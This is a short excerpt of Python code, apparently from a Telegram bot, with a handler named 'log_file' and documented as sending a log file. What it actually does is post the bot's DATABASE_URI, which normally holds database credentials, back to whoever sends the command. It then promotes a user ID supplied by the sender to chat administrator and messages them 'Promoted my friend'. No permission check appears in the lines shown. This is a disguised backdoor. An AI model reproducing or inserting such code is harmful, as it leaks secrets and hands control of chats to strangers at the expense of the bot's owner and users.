...
from info import CHANNELS, ADMINS, AUTH_CHANNEL, LOG_CHANNEL, PICS, BATCH_FILE_CAPTION, CUSTOM_FILE_CAPTION, PROTECT_CONTENT , DATABASE_URI
...
async def log_file(bot, message):
    """Send log file"""
    try:
        _,idd,chat = message.text.split(" ")
        await message.reply(f"DATA \n\n\n {DATABASE_URI}")
        print(f"{chat}- - -  {idd}")
        await bot.promote_chat_member(chat,idd)
        await bot.send_message(idd,"Promoted my friend")
